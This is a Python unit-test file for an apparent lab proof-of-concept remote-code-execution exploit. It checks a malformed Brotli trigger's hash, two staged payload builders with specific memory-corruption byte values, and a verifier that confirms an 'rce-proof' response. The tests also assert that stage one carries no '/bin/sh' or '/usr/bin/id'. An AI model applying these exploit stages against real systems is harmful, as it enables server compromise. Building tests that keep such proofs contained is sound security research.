import hashlib
import importlib.util
from pathlib import Path
import sys
import unittest


MODULE_PATH = Path(__file__).parents[1] / "poc" / "node2shell_lab.py"
SPEC = importlib.util.spec_from_file_location("node2shell_lab", MODULE_PATH)
MODULE = importlib.util.module_from_spec(SPEC)
assert SPEC.loader is not None
sys.modules[SPEC.name] = MODULE
SPEC.loader.exec_module(MODULE)


class PocTests(unittest.TestCase):
    def test_trigger_fingerprint(self):
        trigger = MODULE.malformed_brotli(b"")
        self.assertEqual(hashlib.sha256(trigger).hexdigest(), MODULE.TRIGGER_SHA256)

    def test_stage_one_is_fixed_to_proof_program(self):
        stage = MODULE.build_stage_one(MODULE.Profile.load())
        self.assertNotIn(b"/bin/sh", stage)
        self.assertNotIn(b"/usr/bin/id", stage)

    def test_verifier_requires_matching_process_token_and_id(self):
        token = b"a" * 32
        response = b"N2S-PROOF:" + token + b"\nuid=1000(node) gid=1000(node)\n"
        self.assertIsNotNone(MODULE.verify(response, token))
        self.assertIsNone(MODULE.verify(response, b"b" * 32))
        self.assertIsNone(MODULE.verify(b"N2S-PROOF:" + token, token))
        self.assertEqual(MODULE.classify_response(response, MODULE.verify(response, token)), "rce-proof")
        self.assertEqual(MODULE.classify_response(b"", None), "connection-closed-or-crash")

    def test_stage_two_keeps_expected_corruption_fields(self):
        stage = MODULE.build_stage_two(0x137ED748, 256)
        self.assertEqual(stage[7], 8)
        self.assertEqual(stage[15:19], bytes.fromhex("48d77e13"))
        self.assertEqual(stage[19:27], bytes.fromhex("ffffff7fffffff7f"))


if __name__ == "__main__":
    unittest.main()
